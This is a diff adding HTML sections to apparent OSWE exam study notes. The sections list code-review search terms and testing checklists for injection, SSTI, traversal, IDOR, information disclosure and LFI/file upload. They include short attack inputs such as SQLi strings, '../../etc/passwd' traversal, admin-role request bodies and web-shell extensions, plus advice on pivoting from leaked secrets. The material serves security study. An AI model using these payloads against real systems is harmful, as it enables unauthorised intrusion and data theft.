+<li><code>shlex.split(...)</code> is safer only with <code>shell=False</code>; do not trust it if a shell wrapper exists upstream</li>
+</ul>
+- search for: `shell=True`, `os.system`, `subprocess`, `Popen`, `bash -c`, `cmd`, `command` -->
+<!-- ## 4. Insecure Deserialization
+<ul>
+<li><code>pickle.loads(...)</code>, <code>pickle.load(...)</code></li>
+<li><code>yaml.load(...)</code>, <code>yaml.full_load(...)</code></li>
+<li><code>marshal.loads(...)</code></li>
+<li>custom <code>object_hook</code>, <code>decode</code>, <code>deserialize</code>, <code>loads</code></li>
+<li><code>__reduce__</code>, <code>__setstate__</code>, <code>__getstate__</code></li>
+<li>unsafe plugins / config / session loading</li>
+</ul>
+- search for: `pickle`, `yaml.load`, `marshal`, `loads`, `deserialize`, `object_hook` -->
+</section>
+<section>
+<h3>9.5. Templates / SSTI</h3>
+<ul>
+<li>Jinja2: <code>render_template</code>, <code>Template(...)</code>, <code>{{ ... }}</code>, <code>{% ... %}</code></li>
+<li>Django templates: <code>render(request, ...)</code>, <code>{{ ... }}</code>, <code>{% ... %}</code></li>
+<li>Mako: <code>${...}</code>, <code>Template(...)</code></li>
+<li>Bottle/SimpleTemplate: <code>template(...)</code></li>
+<li>Tornado: <code>render()</code>, <code>Template(...)</code></li>
+<li>Chameleon/custom renderers: <code>render()</code>, <code>template()</code></li>
+<li>route → view → template → user input</li>
+<li>SSTI payloads usually hit <code>{{</code>, <code>{%</code>, <code>${...}</code></li>
+</ul>
+<!-- ## 6. XSS
+<ul>
+<li><code>render_template</code>, <code>render_template_string</code></li>
+<li><code>HttpResponse</code>, <code>HTMLResponse</code>, <code>Response(</code></li>
+<li><code>mark_safe</code>, <code>SafeString</code>, <code>|safe</code></li>
+<li>raw HTML return / string interpolation in response</li>
+<li><code>request.args</code>, <code>request.form</code>, <code>request.GET</code>, <code>request.POST</code></li>
+</ul>
+- search for: `Response(`, `HttpResponse`, `mark_safe`, `|safe`, `{{`, `request.GET` -->
+<!-- ## 7. File Upload
+<ul>
+<li><code>request.files</code>, <code>FileStorage</code></li>
+<li><code>secure_filename</code>, <code>save(...)</code>, <code>open(...)</code>, <code>os.path.join(...)</code></li>
+<li><code>filename</code>, <code>content_type</code>, <code>mimetype</code>, <code>ext</code>, <code>splitext()</code></li>
+<li><code>shutil.move</code>, <code>os.rename</code>, <code>Path.write_bytes</code>, <code>Path.write_text</code></li>
+<li>extension allowlist / blacklist bypass</li>
+<li>path traversal via upload dir + user filename</li>
+<li><code>../</code>, <code>%2e%2e</code>, <code>../../</code>, symlinked upload directories</li>
+<li>web shell upload patterns: <code>.php</code>, <code>.jsp</code>, <code>.aspx</code>, <code>.phtml</code>, <code>.py</code>, <code>.sh</code></li>
+</ul>
+- search for: `request.files`, `save`, `filename`, `secure_filename`, `upload` -->
+</section>
+<section>
+<h3>9.8. SQLi</h3>
+<ul>
+<li><code>execute(...)</code>, <code>executemany(...)</code>, <code>cursor.execute(...)</code></li>
+<li>raw SQL strings; <code>%s</code>, <code>format(...)</code>, f-strings</li>
+<li><code>sqlalchemy.text(...)</code>, <code>session.execute(...)</code></li>
+<li><code>where user = ...</code>, <code>filter_by(...)</code>, <code>query.filter(...)</code></li>
+<li><code>union</code>, <code>--</code>, <code>or 1=1</code>, <code>&#x27; OR &#x27;1&#x27;=&#x27;1</code> </li>
+<li><code>LIMIT</code>, <code>ORDER BY</code>, <code>OFFSET</code></li>
+<li>if user input reaches <code>WHERE</code>, <code>LIMIT</code>, or <code>ORDER BY</code>, inspect closely</li>
+<li>search for: <code>execute</code>, <code>query</code>, <code>filter_by</code>, <code>union</code>, <code>ORDER BY</code>, <code>LIMIT</code></li>
+</ul>
+</section>
+<section>
+<h3>9.9. Directory Traversal</h3>
+<ul>
+<li><code>open(...)</code>, <code>os.path.join(...)</code>, <code>Path(...)</code>, <code>send_file(...)</code></li>
+<li><code>read_text()</code>, <code>read_bytes()</code>, <code>open(&#x27;/etc/passwd&#x27;)</code></li>
+<li><code>../</code>, <code>..\</code>, <code>%2e%2e</code>, <code>%2f</code>, <code>..%2f</code></li>
+<li>file reads from uploads, templates, logs, configs</li>
+<li><code>safe_join</code>, <code>basename</code>, <code>FileResponse</code></li>
+<li>zip slip: <code>zipfile.extract(...)</code>, <code>extractall()</code></li>
+<li>search for: <code>open(</code>, <code>Path(</code>, <code>send_file</code>, <code>basename</code>, <code>zipfile</code></li>
+</ul>
+</section>
+<section>
+<h3>9.10. Monkey Patch / Object Mutation</h3>
+<ul>
+<li><code>setattr(...)</code>, <code>getattr(...)</code>, <code>globals()</code>, <code>locals()</code></li>
+<li><code>__import__(...)</code>, <code>importlib.import_module(...)</code>, <code>importlib.reload(...)</code></li>
+<li><code>module.func = ...</code>, <code>obj.method = ...</code>, <code>obj.__dict__</code></li>
+<li><code>__dict__</code> = runtime attribute map; if user data can mutate it, auth/sanitizer behavior may change</li>
+<li>runtime override of auth, sanitizers, file functions, subprocess functions</li>
+<li>patching imported framework or library internals after load</li>
+<li><code>mock.patch</code>, <code>patch(...)</code>, <code>unittest.mock</code></li>
+<li>search for: <code>__dict__</code>, <code>setattr</code>, <code>getattr</code>, <code>importlib</code>, <code>globals</code>, <code>locals</code>, <code>__import__</code></li>
+</ul>
+</section>
+<section>
+<h3>9.11. Rabbit Holes</h3>
+<ul>
+<li><code>strip()</code>, <code>lower()</code>, <code>replace()</code></li>
+<li><code>random.randint()</code>, <code>random.randrange()</code>, <code>uuid.uuid4()</code></li>
+<li><code>hashlib.sha256()</code>, <code>hashlib.md5()</code></li>
+<li><code>re.match()</code>, <code>re.search()</code>, <code>re.findall()</code></li>
+<li><code>os.path.abspath()</code>, <code>os.path.normpath()</code></li>
+<li><code>startswith()</code>, <code>endswith()</code>, <code>isdigit()</code></li>
+<li>these are usually not bugs by themselves; they matter only if they gate a sink</li>
+<li>if it never reaches a sink, move on</li>
+<li>good rule: identify the sink first, then trace input back</li>
+</ul>
+</section>
+<section>
+<h3>9.12. KPI’s / High-Value Files</h3>
+<ul>
+<li><code>config.py</code>, <code>settings.py</code>, <code>database.py</code>, <code>db.py</code>, <code>connect.py</code>, <code>app.py</code></li>
+<li><code>os.environ</code>, <code>getenv()</code>, <code>environ</code>, <code>dotenv</code>, <code>configparser</code>, <code>yaml.safe_load</code></li>
+<li><code>sqlite3.connect(...)</code>, <code>psycopg2.connect(...)</code>, <code>mysql.connector.connect(...)</code>, <code>sqlalchemy.create_engine(...)</code></li>
+<li><code>locals()</code>, <code>vars()</code>, <code>globals()</code>, <code>**locals()</code>, <code>**kwargs</code>, <code>dict(...)</code></li>
+<li><code>exec(...)</code>, <code>eval(...)</code>, <code>__import__(...)</code>, <code>importlib.import_module(...)</code></li>
+<li><code>flask.current_app.config</code>, <code>app.config</code>, <code>config.from_object</code>, <code>config.from_envvar</code></li>
+<li>if config is imported and then used in a sink, it is usually high value</li>
+</ul>
+</section>
+<section>
+<h3>9.13. Auth / Session</h3>
+<ul>
+<li><code>flask.session</code>, <code>request.cookies</code>, <code>session[...]</code>, <code>jwt</code>, <code>itsdangerous</code></li>
+<li><code>login_required</code>, <code>is_authenticated</code>, <code>check_password_hash</code>, <code>verify_password</code></li>
+<li><code>set_cookie</code>, <code>session.modified</code>, <code>session.permanent</code>, <code>cookie_secret</code></li>
+<li><code>token</code>, <code>secret</code>, <code>auth</code>, <code>bearer</code>, <code>Authorization</code></li>
+<li><code>app.secret_key</code>, <code>SecureCookieSessionInterface</code></li>
+<li>search for: <code>session</code>, <code>cookie</code>, <code>secret</code>, <code>token</code>, <code>Authorization</code>, <code>login_required</code></li>
+</ul>
+</section>
+<section>
+<h3>9.14. SSRF</h3>
+<ul>
+<li><code>requests.get()</code>, <code>requests.post()</code>, <code>httpx</code>, <code>urllib</code>, <code>urllib3</code></li>
+<li><code>allow_redirects</code>, <code>verify=False</code>, <code>timeout</code>, <code>Session()</code></li>
+<li><code>urljoin</code>, <code>redirect()</code>, <code>fetch()</code>, <code>requests.request()</code></li>
+<li>internal IP / localhost checks: <code>127.0.0.1</code>, <code>localhost</code>, <code>10.0.0.0/8</code>, <code>172.16/12</code>, <code>192.168/16</code></li>
+<li>search for: <code>requests</code>, <code>httpx</code>, <code>urlopen</code>, <code>fetch</code>, <code>allow_redirects</code>, <code>urljoin</code></li>
+</ul>
+</section>
+<section>
+<h3>9.15. XML / XXE</h3>
+<ul>
+<li><code>xml.etree.ElementTree</code>, <code>lxml</code>, <code>defusedxml</code>, <code>etree.parse</code>, <code>XMLParser</code></li>
+<li><code>parse(..., parser=...)</code>, <code>iterparse</code>, <code>fromstring</code></li>
+<li><code>&lt;!DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>PUBLIC</code></li>
+<li>search for: <code>XMLParser</code>, <code>parse</code>, <code>fromstring</code>, <code>ENTITY</code>, <code>SYSTEM</code>, <code>DOCTYPE</code></li>
+</ul>
+</section>
+<section>
+<h3>9.16. Mass Assignment / Object Hydration</h3>
+<ul>
+<li><code>**data</code>, <code>User(**payload)</code>, <code>obj.__dict__</code>, <code>dict(request.form)</code>, <code>request.form.to_dict()</code></li>
+<li><code>setattr(...)</code>, <code>getattr(...)</code>, <code>vars(obj)</code>, <code>__slots__</code></li>
+<li>Pydantic / FastAPI: <code>BaseModel</code>, <code>model_validate()</code>, <code>model_copy(update=...)</code></li>
+<li>search for: <code>**data</code>, <code>__dict__</code>, <code>model_validate</code>, <code>request.form</code>, <code>User(</code></li>
+</ul>
+<!-- ## 17. Unsafe File Ops
+<ul>
+<li><code>os.remove</code>, <code>unlink()</code>, <code>rmtree()</code>, <code>shutil.copy</code>, <code>shutil.move</code>, <code>mkstemp()</code></li>
+<li><code>open(...)</code>, <code>Path.write_text</code>, <code>Path.write_bytes</code>, <code>NamedTemporaryFile</code></li>
+<li>file writes from user-controlled paths or names</li>
+<li>treat config/cache/upload state changes as security-sensitive</li>
+</ul>
+- search for: `unlink`, `remove`, `rmtree`, `write_text`, `NamedTemporaryFile`, `shutil.move` -->
+<!-- ## 18. CSRF / Session State
+<ul>
+<li><code>csrf</code>, <code>token</code>, <code>SameSite</code>, <code>session_cookie</code>, <code>csrf_token</code></li>
+<li><code>validate_csrf</code>, <code>protect</code>, <code>csrf_protect</code>, <code>@csrf.exempt</code></li>
+<li>session fixation via reused tokens, cookies, login state</li>
+</ul>
+- search for: `csrf`, `SameSite`, `session_cookie`, `csrf_token`, `validate_csrf` -->
+</section>
+<section>
+<h3>Quick Review Rule</h3>
+<ul>
+<li>Start with the sink: shell, eval, file write, template render, SQL, open, session/auth.</li>
+<li>Trace the user input backward.</li>
+<li>If the “fix” is only <code>strip()</code>, <code>lower()</code>, <code>replace()</code>, regex, or normalization, it is usually a rabbit hole unless it gates a real sink.</li>
+<li>Best OSWE clue: dynamic import + monkey patch + object mutation + config + runtime globals.</li>
+</ul>
+ </details>
+</section>
+</article>
+<article>
+<h1 id="vectors">Vectors</h1>
+<details open>
+<summary id="business-logic-idor-notes"><h2>10. Business Logic / IDOR Notes</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>business-logic and access-control flaws, including IDOR, privilege bypass, state transitions, object mutation, enumeration, and race conditions</li>
+</ul>
+</section>
+<section>
+<h3>10.0. The 10 Patterns to Check First</h3>
+<ul>
+<li>Object IDs in URL or JSON: <code>id</code>, <code>userId</code>, <code>accountId</code>, <code>orderId</code>, <code>fileId</code>, <code>reportId</code></li>
+<li>Role or privilege checks: <code>admin</code>, <code>isAdmin</code>, <code>role</code>, <code>permission</code>, <code>canEdit</code>, <code>owner</code>, <code>author</code></li>
+<li>Multi-step workflow abuse: create → approve → pay → cancel → refund → delete</li>
+<li>State transition abuse: pending → approved → shipped → refunded → deleted</li>
+<li>Hidden or debug endpoints: <code>/admin</code>, <code>/debug</code>, <code>/internal</code>, <code>/test</code>, <code>/dev</code>, <code>?debug=1</code></li>
+<li>Missing authorization on action endpoints: update, delete, transfer, reset, export, download</li>
+<li>Request-body state override: server-side auth, ownership, or status values</li>
+<li>Enumeration and weak object matching: guessable IDs or sequential records</li>
+<li>Missing business-rule validation: price, coupon, discount, limit, quota, permission</li>
+<li>Client-side trust: JS, hidden fields, cookies, query params, request body</li>
+</ul>
+</section>
+<section>
+<h3>10.1. IDOR / Direct Object Reference</h3>
+<ul>
+<li>changing <code>id</code> or <code>userId</code> to access another record</li>
+<li><code>GET /invoice?id=42</code> → <code>GET /invoice?id=43</code></li>
+<li><code>GET /profile?user=1</code> → <code>GET /profile?user=2</code></li>
+<li><code>DELETE /orders/123</code> without ownership or admin check</li>
+<li><code>GET /download?file=report.pdf</code> with no path or ownership enforcement</li>
+<li>often seen in APIs, dashboards, upload/download endpoints, admin functions</li>
+</ul>
+</section>
+<section>
+<h3>10.2. Auth / Privilege Bypass</h3>
+<ul>
+<li>route protected only on one path or one controller method</li>
+<li>auth check in middleware but not on a sub-route or action</li>
+<li>privileged flag in body: <code>{&quot;admin&quot;: true}</code> or <code>{&quot;role&quot;: &quot;admin&quot;}</code></li>
+<li>user can create own session or token with stronger role</li>
+<li>hidden flag in cookie or query string controlling access</li>
+<li>insecure default permissions or lower-role fallback</li>
+</ul>
+</section>
+<section>
+<h3>10.3. Money / Price / Discount Abuse</h3>
+<ul>
+<li>discount or coupon validated only client-side</li>
+<li>price changed in request body before payment/checkout</li>
+<li>negative amounts, duplicate coupon use, refund abuse, bypass of max limit</li>
+<li>free order by modifying total / tax / quantity / currency</li>
+<li>state transition: <code>pending</code> → <code>paid</code> without proper validation</li>
+</ul>
+</section>
+<section>
+<h3>10.4. Password / Reset / MFA Abuse</h3>
+<ul>
+<li>reset token not bound to user</li>
+<li>token replay after use or after logout</li>
+<li>password reset flow with predictable token or no verification</li>
+<li>bypass via user-supplied <code>email</code> or <code>id</code> in reset link</li>
+<li>weak 2FA or missing session re-check on permission changes</li>
+</ul>
+</section>
+<section>
+<h3>10.5. Multi-Step Workflow Abuse</h3>
+<ul>
+<li>create record → change status → bypass rules</li>
+<li>approve without required second factor</li>
+<li>export before validation</li>
+<li>delete object without checking parent object or owner</li>
+<li>cancel order after refund or transfer has already happened</li>
+<li>check state transitions: pending → approved → completed → archived</li>
+</ul>
+</section>
+<section>
+<h3>10.6. State Validation Bugs</h3>
+<ul>
+<li>missing check for current state before action</li>
+<li>user can do action when object is in wrong state</li>
+<li>action allowed for one role but not enforced on backend</li>
+<li><code>isActive</code>, <code>ownerId</code>, <code>approved</code>, <code>locked</code>, <code>deleted</code>, <code>admin</code>, <code>enabled</code> changed from request input</li>
+</ul>
+</section>
+<section>
+<h3>10.7. Mass Assignment / Object Mutation</h3>
+<ul>
+<li>user can set fields like <code>role</code>, <code>admin</code>, <code>is_active</code>, <code>owner</code>, <code>verified</code>, <code>balance</code>, <code>permissions</code></li>
+<li>JSON payload maps directly into user model or database row</li>
+<li>custom DTO / body binding with too many allowed fields</li>
+<li>request body or query data controlling backend state without validation</li>
+</ul>
+</section>
+<section>
+<h3>10.8. Hidden / Debug / Internal Routes</h3>
+<ul>
+<li><code>/admin</code>, <code>/debug</code>, <code>/internal</code>, <code>/metrics</code>, <code>/health</code>, <code>/test</code>, <code>/setup</code></li>
+<li>debug features left behind in production</li>
+<li>endpoints protected by user-agent or hidden parameter checks</li>
+<li>feature flags exposed or toggled by request parameter</li>
+</ul>
+</section>
+<section>
+<h3>10.9. Client-Side Trust Bugs</h3>
+<ul>
+<li>JS validation only</li>
+<li>hidden input fields set to privileged values</li>
+<li>request body fields for <code>price</code>, <code>amount</code>, <code>status</code>, <code>role</code>, <code>user_id</code></li>
+<li>cookie or local token used as access-control signal</li>
+<li>app trusts the client’s state more than the server’s canonical state</li>
+</ul>
+</section>
+<section>
+<h3>10.10. Enumeration / Guessable IDs</h3>
+<ul>
+<li>predictable IDs: <code>1,2,3,4</code></li>
+<li>sequential numeric records</li>
+<li>IDs leaked in page source, API responses, logs, hidden fields, JS bundles</li>
+<li>access without authorization or ownership check</li>
+<li>admin or account objects reachable with guessed IDs</li>
+</ul>
+</section>
+<section>
+<h3>10.11. File Access / Download Abuse</h3>
+<ul>
+<li><code>download?id=123</code> returns another user’s document</li>
+<li><code>report=123</code> exposes arbitrary file or attachment</li>
+<li>file names or object IDs used without ownership check</li>
+<li>exported/report endpoints leak data without authorization</li>
+</ul>
+</section>
+<section>
+<h3>10.12. Search / Filter Abuse</h3>
+<ul>
+<li>filter values allow access to records outside intended scope</li>
+<li><code>?user_id=123</code> or <code>?account=999</code> can cross boundaries</li>
+<li>search results include unauthorized objects if filters are not enforced server-side</li>
+<li>backend trust of query params instead of session / auth object</li>
+</ul>
+</section>
+<section>
+<h3>10.13. Race / Time-of-Check Time-of-Use</h3>
+<ul>
+<li>two requests can alter state between read and write</li>
+<li>apply coupon twice</li>
+<li>redeem gift card twice</li>
+<li>delete while another operation is reading it</li>
+<li>approve and refund in same workflow without lock or validation</li>
+</ul>
+</section>
+<section>
+<h3>10.14. High-Value Search Terms</h3>
+<ul>
+<li><code>id</code>, <code>userId</code>, <code>ownerId</code>, <code>accountId</code>, <code>invoiceId</code>, <code>orderId</code>, <code>fileId</code>, <code>role</code>, <code>admin</code>, <code>permission</code>, <code>owner</code>, <code>isAdmin</code>, <code>canEdit</code>, <code>approved</code>, <code>status</code>, <code>balance</code>, <code>price</code>, <code>discount</code>, <code>coupon</code>, <code>export</code>, <code>download</code>, <code>reset</code>, <code>token</code></li>
+</ul>
+</section>
+<section>
+<h3>10.15. Quick Review Rule</h3>
+<ul>
+<li>if a user can influence a record ID, role, status, amount, or action, inspect it</li>
+<li>check server-side ownership and privilege checks</li>
+<li>check step-by-step flow validation</li>
+<li>if the action has a real-world consequence, it is high value</li>
+</ul>
+</section>
+<section>
+<h3>10.16. Quick Payloads</h3>
+<h4>IDOR</h4>
+<ul>
+<li>change <code>id=1</code> to <code>id=2</code></li>
+<li>change <code>userId=abc</code> to <code>userId=admin</code></li>
+<li>manipulate <code>orderId</code>, <code>invoiceId</code>, <code>fileId</code>, <code>reportId</code></li>
+<li>tamper with query param, JSON body, hidden form field</li>
+</ul>
+<h4>Privilege Abuse</h4>
+<ul>
+<li><code>{&quot;role&quot;:&quot;admin&quot;}</code></li>
+<li><code>{&quot;admin&quot;:true}</code></li>
+<li><code>?isAdmin=true</code></li>
+<li><code>?role=admin</code></li>
+<li>cookie or token value that bypasses role check</li>
+</ul>
+<h4>State Abuse</h4>
+<ul>
+<li>approve without required checks</li>
+<li>refund after cancel</li>
+<li>apply coupon twice</li>
+<li>negative price or free purchase</li>
+<li>bypass quantity / limit / coupon validation</li>
+</ul>
+</section>
+<section>
+<h3>10.17. Final Rule</h3>
+<ul>
+<li>business logic bugs are often easier to exploit than classic injection</li>
+<li>they usually come from missing server-side checks, not missing payloads</li>
+<li>if the app trusts client-controlled state, inspect it aggressively</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="information-disclosure"><h2>11. Information Disclosure</h2></summary>
+<section>
+<h3>Goal</h3>
+<ul>
+<li>Find places where the app leaks data that should not be visible.</li>
+<li>Confirm the leak is real, useful, and reachable.</li>
+<li>Use it to pivot to auth bypass, config access, secrets, internal hosts, source code, logic, or admin functions.</li>
+<li>In OSWE, disclosure is usually a stepping stone, not the final issue.</li>
+</ul>
+</section>
+<section>
+<h3>11.1. How to Discover It</h3>
+<h4>A. Error and exception handling</h4>
+<ul>
+<li>500 errors, stack traces, debug pages, tracebacks, verbose errors.</li>
+<li>Application crash output with file paths, framework names, library versions.</li>
+<li>SQL errors revealing query structure, table names, columns.</li>
+<li>Deserialization errors exposing class names and internal object graphs.</li>
+<li>Unhandled exceptions in API endpoints, file upload handlers, template rendering, session logic.</li>
+</ul>
+<h4>B. Response headers</h4>
+<ul>
+<li><code>Server</code>, <code>X-Powered-By</code>, <code>X-AspNet-Version</code>, <code>Stack</code>, <code>Framework</code>, <code>Tool</code>.</li>
+<li><code>Set-Cookie</code> with insecure flags or session structure.</li>
+<li><code>Location</code> leaks internal paths or redirect chains.</li>
+<li><code>Content-Type</code> with unexpected mime confusion.</li>
+<li><code>Via</code>, <code>X-Forwarded-*</code>, <code>X-Backend-*</code>, <code>X-Envoy-*</code>, <code>X-Cache</code>.</li>
+</ul>
+<h4>C. URLs and directory structure</h4>
+<ul>
+<li><code>/admin</code>, <code>/debug</code>, <code>/manage</code>, <code>/metrics</code>, <code>/actuator</code>, <code>/phpinfo.php</code>, <code>/console</code>, <code>/logs</code>.</li>
+<li>Backup names: <code>.bak</code>, <code>.old</code>, <code>.orig</code>, <code>.save</code>, <code>.tmp</code>, <code>.zip</code>, <code>.sql</code>, <code>.tar.gz</code>.</li>
+<li>Source files: <code>.git</code>, <code>.svn</code>, <code>.hg</code>, <code>.env</code>, <code>config</code>, <code>settings</code>, <code>secrets</code>, <code>swagger</code>, <code>openapi</code>.</li>
+<li>Default framework endpoints, health pages, debug routes.</li>
+<li>Unprotected API docs and schema files.</li>
+</ul>
+<h4>D. Source and config exposure</h4>
+<ul>
+<li><code>/.git/config</code>, <code>/.git/HEAD</code>, <code>/.svn</code>, <code>/.hg</code>.</li>
+<li><code>config.php</code>, <code>settings.py</code>, <code>application.properties</code>, <code>appsettings.json</code>, <code>web.config</code>.</li>
+<li><code>.env</code>, <code>.env.local</code>, <code>.env.production</code>, <code>docker-compose.yml</code>, <code>kubernetes</code> manifests.</li>
+<li>Hardcoded secrets, tokens, DB URLs, API keys, encryption keys.</li>
+<li>Debug configs and feature flags.</li>
+</ul>
+<h4>E. File read / directory traversal</h4>
+<ul>
+<li>Read arbitrary files via <code>../</code>, <code>%2e%2e</code>, encoded traversal.</li>
+<li>Access logs, configs, backups, password stores, certificate keys.</li>
+<li>Exposed upload directories or static file roots.</li>
+<li>ZIP extraction leads to local file disclosure.</li>
+</ul>
+<h4>F. IDOR and object enumeration</h4>
+<ul>
+<li>IDOR = insecure direct object reference: user-controlled object identifiers are accepted without proper authorization checks.</li>
+<li>User IDs, ticket IDs, invoice IDs leaking internal records.</li>
+<li>Enumerating <code>GET /account/1</code>, <code>.../2</code>, <code>.../3</code>.</li>
+<li>Hidden API endpoints returning other users’ objects.</li>
+<li>Access control checks performed only on some routes.</li>
+</ul>
+<h4>G. Verbose auth / session behavior</h4>
+<ul>
+<li>Distinct error messages for bad username vs bad password.</li>
+<li>Account enumeration via response timing, status codes, JS messages, HTML differences.</li>
+<li>Session token leakage in URLs, logs, Referer, JS, cached responses.</li>
+<li>JWT structure leaks roles, algorithms, issuer, claims.</li>
+</ul>
+<h4>H. Caching and browser behavior</h4>
+<ul>
+<li><code>Cache-Control</code>, <code>Pragma</code>, <code>Expires</code>, <code>ETag</code> on sensitive pages.</li>
+<li>Shared caches, CDN, proxies storing secret responses.</li>
+<li>Private data in HTML comments, JS constants, JSON blobs, API responses.</li>
+<li>Browser devtools, saved pages, search indexes, logs.</li>
+</ul>
+<h4>I. Verbose backend / framework behavior</h4>
+<ul>
+<li>Flask/Django/FastAPI debug mode pages.</li>
+<li>Java/Spring boot actuator endpoints.</li>
+<li><code>.NET</code> environment info, route maps, exception dumps.</li>
+<li><code>phpinfo()</code>, <code>server status</code>, <code>status.jsp</code>, <code>health</code> endpoints.</li>
+<li>GraphQL introspection and schema dumping.</li>
+</ul>
+<h4>J. Common OSWE-style leakage patterns</h4>
+<ul>
+<li>Default app pages leak internal stack layout.</li>
+<li>Error pages include file names and line numbers.</li>
+<li><code>print()</code> or logging of raw request data.</li>
+<li>Debug mode left on in prod.</li>
+<li>Input reflected into templates or errors without encoding.</li>
+<li>Secrets in commit history, backups, or packaged static assets.</li>
+</ul>
+</section>
+<section>
+<h3>11.2. What to Do With It</h3>
+<h4>A. Verify the disclosure is real</h4>
+<ul>
+<li>Reproduce the leak with a single crafted request.</li>
+<li>Confirm it is not a front-end-only artifact or stale cache.</li>
+<li>Check whether data is static or dynamically generated.</li>
+<li>Determine exact scope: one user, all users, internal system, admin-only, all hosts.</li>
+</ul>
+<h4>B. Classify the value</h4>
+<ul>
+<li>High value: credentials, session tokens, API keys, secrets, internal IPs, DB URIs, admin paths.</li>
+<li>Medium value: stack traces, source file names, framework versions, route names, config fragments.</li>
+<li>Low value: harmless metadata, generic headers, minor version numbers.</li>
+</ul>
+<h4>C. Pivot from the leak</h4>
+<ul>
+<li>Secrets -&gt; auth bypass / API abuse.</li>
+<li>Internal hostnames -&gt; SSRF / port scanning / service discovery.</li>
+<li>Config values -&gt; DB access, service credentials, JWT signing key.</li>
+<li>Stack traces -&gt; code path identification and deeper exploitation.</li>
+<li>Source file names -&gt; target likely vulnerable functions and business logic.</li>
+<li>Admin endpoints -&gt; privilege escalation and direct takeover.</li>
+</ul>
+<h4>D. Use it for chain building</h4>
+<p>- auth bypass - IDOR - SSRF - SQL injection via DB creds or error details - remote command execution via misconfigured secrets - token forgery and privilege escalation - file read/write via path or upload config</p>
+<ul>
+<li>Disclosure often leads to:</li>
+</ul>
+<h4>E. Make it exam-usable</h4>
+<ul>
+<li>Capture exact endpoint, request, response, and leak type.</li>
+<li>Reflect whether leak is direct, reflected, or reachable via unprotected route.</li>
+<li>Map what object is exposed and what security boundary it breaks.</li>
+<li>Note whether the leak helps identify deeper vulnerabilities.</li>
+</ul>
+<h4>F. Operational discipline</h4>
+<ul>
+<li>Keep the finding narrow, reproducible, and tied to a security boundary.</li>
+<li>Do not confuse “leak of metadata” with “vulnerability” unless it leads to impact.</li>
+<li>In OSWE, the key question is: what does this leak enable?</li>
+<li>If it exposes no actionable boundary break, treat it as a lower-priority observation.</li>
+</ul>
+</section>
+<section>
+<h3>11.3. High-Value Discovery Checklist</h3>
+<ul>
+<li><code>500</code> + traceback + file path + framework banner</li>
+<li><code>/admin</code>, <code>/debug</code>, <code>/actuator</code>, <code>/env</code>, <code>/swagger</code>, <code>/graphql</code></li>
+<li><code>.env</code>, <code>settings</code>, <code>config</code>, <code>web.config</code>, <code>application.properties</code></li>
+<li><code>Authorization</code>, <code>jwt</code>, cookies, tokens, bearer secrets</li>
+<li>internal IPs, hosts, DB URIs, private URLs</li>
+<li>SQL/ORM errors, stack dumps, object introspection</li>
+<li>hidden backups, archives, and source-control metadata</li>
+<li>debug mode enabled, verbose logging in production</li>
+</ul>
+</section>
+<section>
+<h3>11.4. Core Mental Model</h3>
+<ul>
+<li>Information disclosure is not just “data was exposed”; it is “a trust boundary failed.”</li>
+<li>The real question is: what did the app reveal that should have stayed internal?</li>
+<li>In an exam, the best disclosure findings are the ones that immediately support the next exploitation step.</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="local-file-inclusion-lfi-file-upload-execution"><h2>12. Local File Inclusion (LFI) / File Upload + Execution</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>local file inclusion and file-based execution paths, including uploads, web shells, traversal, and chained file sinks</li>
+</ul>
+</section>
+<section>
+<h3>12.0. The 10 Patterns to Check First</h3>
+<ul>
+<li>Direct File Inclusion: <code>include</code>, <code>require</code>, <code>include_once</code>, <code>require_once</code></li>
+<li>File Read / LFI: <code>file_get_contents</code>, <code>readfile</code>, <code>fopen</code>, <code>fopen(..., &#x27;r&#x27;)</code>, <code>file()</code></li>
+<li>Input to Include Paths: <code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>, <code>$_COOKIE</code>, <code>$_SERVER</code>, <code>path</code>, <code>file</code>, <code>page</code>, <code>template</code>, <code>lang</code>, <code>module</code></li>
+<li>File Upload Sinks: <code>move_uploaded_file</code>, <code>$_FILES</code>, <code>tmp_name</code>, <code>name</code>, <code>type</code>, <code>content</code>, <code>upload</code></li>
+<li>File Write / Web Shell Creation: <code>file_put_contents</code>, <code>fopen(..., &#x27;w&#x27;)</code>, <code>fwrite</code>, <code>rename</code>, <code>copy</code>, <code>rename</code>, <code>mv</code></li>
+<li>Execution After Upload or File Inclusion: <code>exec</code>, <code>system</code>, <code>shell_exec</code>, <code>passthru</code>, <code>proc_open</code>, <code>popen</code>, <code>Runtime.exec</code>, <code>Process.Start</code></li>
+<li>Traversal / Path Bypass: <code>../</code>, <code>..\</code>, <code>%2e%2e</code>, <code>%2f</code>, <code>..%2f</code></li>
+<li>File Enumeration and Disclosure: <code>glob</code>, <code>opendir</code>, <code>readdir</code>, <code>scandir</code></li>
+<li>Archive Abuse / RCE: <code>ZipArchive</code>, <code>tar</code>, <code>extract</code>, <code>unzip</code>, <code>upload</code> / decompression</li>
+<li>Common LFI Abuse Vectors: <code>template</code>, <code>view</code>, <code>render</code>, <code>include</code>, <code>layout</code>, <code>theme</code>, <code>locale</code>, <code>language</code></li>
+</ul>
+</section>
+<section>
+<h3>12.1. LFI Basics</h3>
+<ul>
+<li>file include from user-controlled path: <code>include($_GET[&#x27;page&#x27;])</code></li>
+<li>file read from user path: <code>readfile($_REQUEST[&#x27;file&#x27;])</code></li>
+<li><code>../</code>, <code>..\</code>, <code>..%2f</code>, <code>%2e%2e%2f</code> are the normal bypasses</li>
+<li>often combined with <code>?page=../../etc/passwd</code> or <code>?file=../../config.php</code></li>
+<li>include path may be relative to app root or a webroot subdirectory</li>
+<li>sometimes the app blocks <code>../</code>, but encoded traversal still succeeds</li>
+</ul>
+</section>
+<section>
+<h3>12.2. Common Include Sinks</h3>
+<ul>
+<li>PHP: <code>include</code>, <code>require</code>, <code>include_once</code>, <code>require_once</code>, <code>file_get_contents</code>, <code>fopen</code>, <code>readfile</code></li>
+<li>Node: <code>fs.readFile</code>, <code>fs.readFileSync</code>, <code>path.join</code>, <code>require</code>, <code>import()</code>, <code>res.sendFile</code>, <code>readFileSync</code></li>
+<li>Java / Spring: <code>new FileInputStream</code>, <code>Paths.get</code>, <code>ClassPathResource</code>, <code>ResourceLoader</code>, <code>readAllBytes</code></li>
